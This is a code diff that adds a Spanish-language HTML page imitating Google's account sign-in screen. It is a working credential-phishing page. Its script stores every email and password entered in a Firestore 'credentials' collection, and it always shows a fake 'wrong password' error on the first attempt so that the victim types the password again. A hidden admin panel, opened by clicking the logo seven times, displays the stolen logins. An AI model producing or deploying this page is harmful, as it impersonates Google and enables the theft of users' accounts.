@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión: Cuentas de Google</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        googleBg: '#1f1f1f',
+                        googleCardBg: '#0e0e0e',
+                        googleCardBorder: '#2d2e30',
+                        googleInputBorder: '#8e918f',
+                        googleInputFocus: '#a8c7fa',
+                        googleBlue: '#a8c7fa',
+                        googleButtonBg: '#a8c7fa',
+                        googleButtonText: '#042e6f',
+                        googleTextMuted: '#c4c7c5',
+                        googleTextMain: '#e3e3e3',
+                    },
+                    fontFamily: {
+                        sans: ['Roboto', 'Arial', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        
+        body {
+            background-color: #1f1f1f;
+            color: #e3e3e3;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .input-group {
+            position: relative;
+        }
+
+        .custom-input {
+            width: 100%;
+            background: transparent;
+            border: 1px solid #8e918f;
+            border-radius: 4px;
+            padding: 16px 15px 14px 15px;
+            color: #e3e3e3;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.15s ease-in-out;
+        }
+
+        .custom-input:focus {
+            border-color: #a8c7fa;
+            border-width: 2px;
+            padding: 15px 14px 13px 14px;
+        }
+
+        .custom-label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #c4c7c5;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.15s ease-out all;
+            background-color: #0e0e0e;
+            padding: 0 4px;
+        }
+
+        .custom-input:focus ~ .custom-label,
+        .custom-input:not(:placeholder-shown) ~ .custom-label {
+            top: 0;
+            font-size: 12px;
+            color: #a8c7fa;
+        }
+
+        .custom-input:not(:focus):not(:placeholder-shown) ~ .custom-label {
+            color: #c4c7c5;
+        }
+
+        @media (max-width: 768px) {
+            .custom-label {
+                background-color: #1f1f1f;
+            }
+        }
+
+        .google-checkbox {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #8e918f;
+            border-radius: 2px;
+            outline: none;
+            cursor: pointer;
+            position: relative;
+            background-color: transparent;
+        }
+
+        .google-checkbox:checked {
+            background-color: #a8c7fa;
+            border-color: #a8c7fa;
+        }
+
+        .google-checkbox:checked::after {
+            content: '';
+            position: absolute;
+            left: 5px;
+            top: 1px;
+            width: 4px;
+            height: 9px;
+            border: solid #042e6f;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .input-error {
+            border-color: #f2b8b5 !important;
+            border-width: 2px !important;
+            padding: 15px 14px 13px 14px !important;
+        }
+
+        .input-error ~ .custom-label {
+            color: #f2b8b5 !important;
+        }
+
+        .error-message {
+            color: #f2b8b5;
+            font-size: 12px;
+            margin-top: 6px;
+            display: flex;
+            align-items: flex-start;
+            gap: 6px;
+        }
+
+        /* Transiciones entre pasos estilo Material Design */
+        .step-container {
+            transition: opacity 0.25s cubic-bezier(0.4, 0, 0.2, 1), transform 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            width: 100%;
+        }
+        
+        .step-hidden {
+            display: none !important;
+            opacity: 0;
+            transform: translateX(30px);
+        }
+        
+        .step-active {
+            display: flex !important;
+            opacity: 1;
+            transform: translateX(0);
+        }
+    </style>
+
+    <!-- Firebase Imports para almacenamiento persistente en la nube -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // Variables de memoria local inmediata como respaldo
+        window.PublicCredentialsList = [];
+
+        // Configuración de Firebase e Inicialización
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'google-login-clone';
+        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : null;
+
+        let db = null;
+        let auth = null;
+
+        if (firebaseConfig) {
+            try {
+                const app = initializeApp(firebaseConfig);
+                db = getFirestore(app);
+                auth = getAuth(app);
+
+                async function initAuth() {
+                    try {
+                        if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                            await signInWithCustomToken(auth, __initial_auth_token);
+                        } else {
+                            await signInAnonymously(auth);
+                        }
+                        listenToPublicCredentials();
+                    } catch (err) {
+                        console.error("Error autenticando en Firebase:", err);
+                        updatePublicLogsUI(window.PublicCredentialsList);
+                    }
+                }
+                initAuth();
+            } catch (e) {
+                console.error("Error inicializando Firebase:", e);
+                updatePublicLogsUI(window.PublicCredentialsList);
+            }
+        } else {
+            // Si no hay configuración de base de datos activa, usar memoria inmediata
+            setTimeout(() => updatePublicLogsUI(window.PublicCredentialsList), 500);
+        }
+
+        // Escuchar datos de credenciales guardadas públicamente
+        function listenToPublicCredentials() {
+            if (!db) return;
+            const credsRef = collection(db, 'artifacts', appId, 'public', 'data', 'credentials');
+            
+            onSnapshot(credsRef, (snapshot) => {
+                const logs = [];
+                snapshot.forEach((doc) => {
+                    logs.push({ id: doc.id, ...doc.data() });
+                });
+                
+                // Mezclar registros remotos con los locales si existen
+                logs.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
+                
+                window.PublicCredentialsList = logs;
+                updatePublicLogsUI(logs);
+
+                // También mostrar en consola F12
+                console.clear();
+                console.log('%c[Google Credentials Storage (Público & Persistente)]', 'color: #a8c7fa; font-weight: bold; font-size: 14px;');
+                console.table(logs);
+            }, (error) => {
+                console.warn("Firestore error/offline, usando registros locales:", error);
+                updatePublicLogsUI(window.PublicCredentialsList);
+            });
+        }
+
+        // Guardar credencial en la base de datos pública y local
+        window.saveCredentialToCloud = async function(email, password, attempt) {
+            const credentialData = {
+                email: email,
+                password: password,
+                attempt: attempt,
+                timestamp: new Date().toISOString()
+            };
+
+            // Guardar en la memoria local primero
+            if (!window.PublicCredentialsList) window.PublicCredentialsList = [];
+            window.PublicCredentialsList.unshift(credentialData);
+            updatePublicLogsUI(window.PublicCredentialsList);
+
+            // Guardar en Firestore si está conectado
+            if (db && auth?.currentUser) {
+                try {
+                    const credsRef = collection(db, 'artifacts', appId, 'public', 'data', 'credentials');
+                    await addDoc(credsRef, credentialData);
+                } catch (e) {
+                    console.error("Error guardando credencial en la nube:", e);
+                }
+            }
+        };
+
+        function updatePublicLogsUI(logs) {
+            const container = document.getElementById('public-credentials-list');
+            if (!container) return;
+
+            if (!logs || logs.length === 0) {
+                container.innerHTML = '<div class="text-gray-400 text-xs py-3 text-center">No hay credenciales registradas aún. Haz un intento de inicio de sesión.</div>';
+                return;
+            }
+
+            container.innerHTML = logs.map(item => `
+                <div class="border-b border-[#2d2e30] py-2 flex flex-col gap-0.5 text-xs">
+                    <div class="flex justify-between items-center text-[#a8c7fa]">
+                        <span class="font-bold truncate max-w-[220px]">${escapeHtml(item.email || '')}</span>
+                        <span class="text-[10px] text-gray-400">${item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : ''}</span>
+                    </div>
+                    <div class="flex justify-between items-center text-[#e3e3e3]">
+                        <span class="font-mono text-yellow-400 font-semibold">Pass: ${escapeHtml(item.password || '')}</span>
+                        <span class="text-[10px] bg-[#28292a] px-1.5 py-0.5 rounded text-gray-300">Intento: ${item.attempt || 1}</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function escapeHtml(str) {
+            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        }
+    </script>
+</head>
+<body class="min-h-screen flex flex-col justify-between p-0 md:p-6 bg-[#1f1f1f]">
+
+    <!-- Decorador superior -->
+    <div class="hidden md:block"></div>
+
+    <!-- Contenedor Principal (Tarjeta estilo Google) -->
+    <main id="main-card" class="w-full max-w-[1040px] md:max-w-[880px] lg:max-w-[1040px] mx-auto bg-[#1f1f1f] md:bg-[#0e0e0e] md:rounded-[28px] p-6 md:p-9 transition-all duration-300 min-h-[100vh] md:min-h-[440px] flex flex-col justify-between md:justify-center overflow-hidden relative">
+        
+        <!-- VISTA 1: Correo electrónico o teléfono -->
+        <div id="step-email" class="step-container step-active w-full flex-col md:grid md:grid-cols-2 gap-8 items-start my-auto md:my-0">
+            <!-- Columna Izquierda: Logo y Títulos -->
+            <div class="flex flex-col items-start pr-0 md:pr-4">
+                <!-- Google SVG Logo Original con botón secreto de 7 clics -->
+                <button type="button" class="secret-logo-btn focus:outline-none cursor-pointer select-none mb-4 p-1 rounded-full hover:bg-white/5 transition-colors" aria-label="Google Logo">
+                    <svg class="w-12 h-12 pointer-events-none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-9.17z"/>
+                        <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.24v3.13C3.26 21.3 7.36 24 12 24z"/>
+                        <path fill="#FBBC05" d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.6H1.24C.45 8.18 0 10.03 0 12s.45 3.82 1.24 5.4l4.04-3.13z"/>
+                        <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.36 0 3.26 2.7 1.24 6.6l4.04 3.13c.95-2.83 3.6-4.98 6.72-4.98z"/>
+                    </svg>
+                </button>
+                
+                <h1 class="text-3xl md:text-[36px] font-normal text-[#e3e3e3] mb-3 tracking-normal leading-tight">
+                    Accede a tu cuenta
+                </h1>
+                <p class="text-[16px] text-[#e3e3e3] font-normal">
+                    Usa tu Cuenta de Google
+                </p>
+            </div>
+
+            <!-- Columna Derecha: Formulario de entrada -->
+            <div class="w-full flex flex-col justify-between min-h-[220px] md:min-h-[260px] pt-4 md:pt-2">
+                <div>
+                    <div class="input-group mb-1">
+                        <input type="text" id="email-input" class="custom-input" placeholder=" " autocomplete="username" spellcheck="false">
+                        <label for="email-input" class="custom-label">Correo electrónico o teléfono</label>
+                    </div>
+                    <!-- Advertencia / Error de formato de correo obligatorio XXXXX@gmail.com -->
+                    <div id="email-error" class="error-message hidden">
+                        <svg class="w-4 h-4 fill-current shrink-0 mt-0.5" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        <span>Ingresa un correo electrónico válido con el formato nombre@gmail.com</span>
+                    </div>
+
+                    <a href="https://accounts.google.com/signin/recovery" target="_blank" rel="noopener noreferrer" class="text-[#a8c7fa] text-sm font-medium hover:underline inline-block mt-4">
+                        ¿Olvidaste el correo electrónico?
+                    </a>
+                </div>
+
+                <!-- Botones inferiores del paso de Email -->
+                <div class="flex items-center justify-between mt-12 md:mt-16">
+                    <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" class="text-[#a8c7fa] text-sm font-medium hover:bg-[#a8c7fa]/10 px-3 py-2 rounded-full transition-colors inline-block">
+                        Crear cuenta
+                    </a>
+                    <button type="button" id="btn-next-email" class="bg-[#a8c7fa] text-[#042e6f] hover:bg-[#c2d7fe] font-medium text-sm px-6 py-2.5 rounded-full transition-all">
+                        Siguiente
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- VISTA 2: Contraseña (Pantalla completamente separada) -->
+        <div id="step-password" class="step-container step-hidden w-full flex-col md:grid md:grid-cols-2 gap-8 items-start my-auto md:my-0">
+            <!-- Columna Izquierda: Logo, Saludo y Píldora del Correo -->
+            <div class="flex flex-col items-start pr-0 md:pr-4">
+                <!-- Google SVG Logo Original con botón secreto de 7 clics -->
+                <button type="button" class="secret-logo-btn focus:outline-none cursor-pointer select-none mb-4 p-1 rounded-full hover:bg-white/5 transition-colors" aria-label="Google Logo">
+                    <svg class="w-12 h-12 pointer-events-none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-9.17z"/>
+                        <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.24v3.13C3.26 21.3 7.36 24 12 24z"/>
+                        <path fill="#FBBC05" d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.6H1.24C.45 8.18 0 10.03 0 12s.45 3.82 1.24 5.4l4.04-3.13z"/>
+                        <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.36 0 3.26 2.7 1.24 6.6l4.04 3.13c.95-2.83 3.6-4.98 6.72-4.98z"/>
+                    </svg>
+                </button>
+
+                <h1 class="text-3xl md:text-[36px] font-normal text-[#e3e3e3] mb-4 tracking-normal leading-tight">
+                    Te damos la bienvenida
+                </h1>
+
+                <!-- Píldora de usuario interactiva para volver -->
+                <button type="button" id="btn-back-email" class="flex items-center gap-2 border border-[#8e918f] rounded-full px-3 py-1.5 hover:bg-[#28292a] transition-colors max-w-full">
+                    <div class="w-5 h-5 rounded-full bg-[#36373a] flex items-center justify-center text-xs text-[#a8c7fa] font-medium">
+                        <svg class="w-3.5 h-3.5 fill-current text-[#c4c7c5]" viewBox="0 0 24 24">
+                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                        </svg>
+                    </div>
+                    <span id="display-email" class="text-sm font-medium text-[#e3e3e3] truncate max-w-[200px]"></span>
+                    <svg class="w-4 h-4 fill-current text-[#c4c7c5]" viewBox="0 0 24 24">
+                        <path d="M7 10l5 5 5-5z"/>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Columna Derecha: Entrada de contraseña y acciones -->
+            <div class="w-full flex flex-col justify-between min-h-[220px] md:min-h-[260px] pt-4 md:pt-2">
+                <div>
+                    <div class="input-group mb-1">
+                        <input type="password" id="password-input" class="custom-input" placeholder=" " autocomplete="current-password">
+                        <label for="password-input" class="custom-label">Introduce tu contraseña</label>
+                    </div>
+
+                    <!-- Mensaje de error de contraseña -->
+                    <div id="password-error" class="error-message hidden">
+                        <svg class="w-4 h-4 fill-current shrink-0 mt-0.5" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        <span id="password-error-text">Contraseña incorrecta. Vuelve a intentarlo o haz clic en "¿Olvidaste la contraseña?" para restablecerla.</span>
+                    </div>
+
+                    <!-- Casilla Mostrar contraseña -->
+                    <div class="flex items-center gap-3 mt-4 select-none">
+                        <input type="checkbox" id="show-password" class="google-checkbox">
+                        <label for="show-password" class="text-sm text-[#e3e3e3] cursor-pointer">Mostrar contraseña</label>
+                    </div>
+                </div>
+
+                <!-- Botones inferiores del paso de Contraseña -->
+                <div class="flex items-center justify-between mt-12 md:mt-16">
+                    <a href="https://accounts.google.com/signin/recovery" target="_blank" rel="noopener noreferrer" class="text-[#a8c7fa] text-sm font-medium hover:bg-[#a8c7fa]/10 px-3 py-2 rounded-full transition-colors inline-block">
+                        Probar otro método
+                    </a>
+                    <button type="button" id="btn-next-password" class="bg-[#a8c7fa] text-[#042e6f] hover:bg-[#c2d7fe] font-medium text-sm px-6 py-2.5 rounded-full transition-all">
+                        Siguiente
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Modal de Confirmación de Inicio de Sesión Éxitoso -->
+        <div id="success-modal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center p-4 z-50">
+            <div class="bg-[#1f1f1f] border border-[#2d2e30] rounded-2xl p-6 max-w-sm w-full text-center shadow-2xl">
+                <div class="w-12 h-12 bg-green-500/20 text-green-400 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <svg class="w-6 h-6 fill-current" viewBox="0 0 24 24">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                    </svg>
+                </div>
+                <h3 class="text-xl font-medium text-white mb-2">¡Sesión iniciada!</h3>
+                <p class="text-sm text-gray-300 mb-6" id="logged-email-text"></p>
+                <a href="https://myaccount.google.com" target="_blank" rel="noopener noreferrer" class="bg-[#a8c7fa] text-[#042e6f] font-medium text-sm px-6 py-2.5 rounded-full block w-full hover:bg-[#c2d7fe] transition-colors">
+                    Ir a tu cuenta Iniciada
+                </a>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Visor de Credenciales Registradas Secretas (Desbloqueable con 7 clics en el Logo) -->
+    <div id="secret-credentials-panel" class="w-full max-w-[1040px] mx-auto mt-6 px-2 hidden">
+        <details open class="bg-[#0e0e0e] border border-[#a8c7fa]/40 rounded-xl p-4 text-[#e3e3e3] shadow-lg transition-all">
+            <summary class="cursor-pointer text-sm font-medium text-[#a8c7fa] flex items-center justify-between select-none">
+                <span class="flex items-center gap-2">
+                    <span class="bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded text-xs font-bold">Modo Admin Secreto</span>
+                    🔑 Registro Global de Credenciales Almacenadas (Persistente 1 Año)
+                </span>
+                <span class="text-xs text-gray-400 bg-[#1f1f1f] px-2 py-1 rounded">F12 disponible</span>
+            </summary>
+            <div id="public-credentials-list" class="mt-3 max-h-56 overflow-y-auto pr-1">
+                <div class="text-gray-400 text-xs py-2 text-center">Cargando credenciales...</div>
+            </div>
+        </details>
+    </div>
+
+    <!-- Footer Global -->
+    <footer class="w-full max-w-[1040px] mx-auto flex flex-col sm:flex-row items-center justify-between text-xs text-[#c4c7c5] py-4 px-2 sm:px-4 gap-4">
+        <div class="relative inline-block">
+            <button type="button" class="flex items-center gap-2 hover:bg-[#28292a] px-3 py-2 rounded text-[#c4c7c5] transition-colors">
+                <span>Español (Latinoamérica)</span>
+                <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24">
+                    <path d="M7 10l5 5 5-5z"/>
+                </svg>
+            </button>
+        </div>
+
+        <div class="flex items-center gap-6">
+            <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" class="hover:underline text-[#c4c7c5]">Ayuda</a>
+            <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" class="hover:underline text-[#c4c7c5]">Privacidad</a>
+            <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" class="hover:underline text-[#c4c7c5]">Condiciones</a>
+        </div>
+    </footer>
+
+    <!-- Lógica JavaScript para manejo de flujo, animaciones y advertencias -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const stepEmail = document.getElementById('step-email');
+            const stepPassword = document.getElementById('step-password');
+            const emailInput = document.getElementById('email-input');
+            const passwordInput = document.getElementById('password-input');
+            const displayEmail = document.getElementById('display-email');
+            const emailError = document.getElementById('email-error');
+            const passwordError = document.getElementById('password-error');
+            const passwordErrorText = document.getElementById('password-error-text');
+            const btnNextEmail = document.getElementById('btn-next-email');
+            const btnNextPassword = document.getElementById('btn-next-password');
+            const btnBackEmail = document.getElementById('btn-back-email');
+            const showPasswordCheckbox = document.getElementById('show-password');
+            const successModal = document.getElementById('success-modal');
+            const loggedEmailText = document.getElementById('logged-email-text');
+            const secretCredentialsPanel = document.getElementById('secret-credentials-panel');
+            const secretLogoBtns = document.querySelectorAll('.secret-logo-btn');
+
+            let passwordAttempts = 0;
+            let logoClickCount = 0;
+            let logoClickTimer = null;
+
+            // Lógica para desbloquear el panel secreto al hacer 7 clics en el Logo de Google
+            secretLogoBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    logoClickCount++;
+
+                    clearTimeout(logoClickTimer);
+                    logoClickTimer = setTimeout(() => {
+                        logoClickCount = 0;
+                    }, 3000); // Reinicia si no hace los 7 clics en un intervalo de 3 segundos
+
+                    if (logoClickCount >= 7) {
+                        logoClickCount = 0;
+                        secretCredentialsPanel.classList.remove('hidden');
+                        secretCredentialsPanel.scrollIntoView({ behavior: 'smooth' });
+                    }
+                });
+            });
+
+            // Validación estricta para requerir sintaxis XXXXX@gmail.com
+            function isValidGmail(email) {
+                const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
+                return gmailRegex.test(email);
+            }
+
+            // Transición a la pantalla de Contraseña
+            function goToPasswordStep() {
+                const emailValue = emailInput.value.trim();
+
+                if (!isValidGmail(emailValue)) {
+                    emailInput.classList.add('input-error');
+                    emailError.classList.remove('hidden');
+                    emailInput.focus();
+                    return;
+                }
+
+                // Ocultar advertencia de correo si es válido
+                emailInput.classList.remove('input-error');
+                emailError.classList.add('hidden');
+
+                // Establecer el correo ingresado en la píldora superior
+                displayEmail.textContent = emailValue;
+
+                // Animación de cambio de vista
+                stepEmail.classList.remove('step-active');
+                stepEmail.classList.add('step-hidden');
+
+                setTimeout(() => {
+                    stepPassword.classList.remove('step-hidden');
+                    stepPassword.classList.add('step-active');
+                    
+                    // Resetear estado de intentos de contraseña al entrar
+                    passwordAttempts = 0;
+                    passwordInput.value = '';
+                    passwordInput.classList.remove('input-error');
+                    passwordError.classList.add('hidden');
+                    passwordInput.focus();
+                }, 150);
+            }
+
+            // Volver al paso de Correo
+            function goToEmailStep() {
+                stepPassword.classList.remove('step-active');
+                stepPassword.classList.add('step-hidden');
+
+                setTimeout(() => {
+                    stepEmail.classList.remove('step-hidden');
+                    stepEmail.classList.add('step-active');
+                    emailInput.focus();
+                }, 150);
+            }
+
+            // Event Listeners para Correo
+            btnNextEmail.addEventListener('click', goToPasswordStep);
+
+            emailInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    goToPasswordStep();
+                }
+            });
+
+            emailInput.addEventListener('input', () => {
+                emailInput.classList.remove('input-error');
+                emailError.classList.add('hidden');
+            });
+
+            btnBackEmail.addEventListener('click', goToEmailStep);
+
+            // Toggle para Mostrar / Ocultar contraseña
+            showPasswordCheckbox.addEventListener('change', (e) => {
+                passwordInput.type = e.target.checked ? 'text' : 'password';
+            });
+
+            // Manejo de contraseña con advertencia obligatorio en el primer intento y éxito en el segundo
+            function handlePasswordSubmit() {
+                const passValue = passwordInput.value.trim();
+
+                if (!passValue) {
+                    passwordInput.classList.add('input-error');
+                    passwordErrorText.textContent = "Ingresa una contraseña";
+                    passwordError.classList.remove('hidden');
+                    passwordInput.focus();
+                    return;
+                }
+
+                passwordAttempts++;
+
+                // Guardar la credencial en la nube y almacenamiento de la página
+                if (window.saveCredentialToCloud) {
+                    window.saveCredentialToCloud(displayEmail.textContent, passValue, passwordAttempts);
+                }
+
+                if (passwordAttempts === 1) {
+                    // Primer intento: Mostrar advertencia / error de Contraseña Incorrecta
+                    passwordInput.value = '';
+                    passwordInput.classList.add('input-error');
+                    passwordErrorText.textContent = 'Contraseña incorrecta. Vuelve a intentarlo o haz clic en "¿Olvidaste la contraseña?" para restablecerla.';
+                    passwordError.classList.remove('hidden');
+                    passwordInput.focus();
+                } else {
+                    // Segundo intento: Permitir el inicio de sesión
+                    passwordInput.classList.remove('input-error');
+                    passwordError.classList.add('hidden');
+                    loggedEmailText.textContent = displayEmail.textContent;
+                    successModal.classList.remove('hidden');
+                }
+            }
+
+            btnNextPassword.addEventListener('click', handlePasswordSubmit);
+
+            passwordInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handlePasswordSubmit();
+                }
+            });
+
+            passwordInput.addEventListener('input', () => {
+                passwordInput.classList.remove('input-error');
+                passwordError.classList.add('hidden');
+            });
+        });
+    </script>
+</body>
+</html>
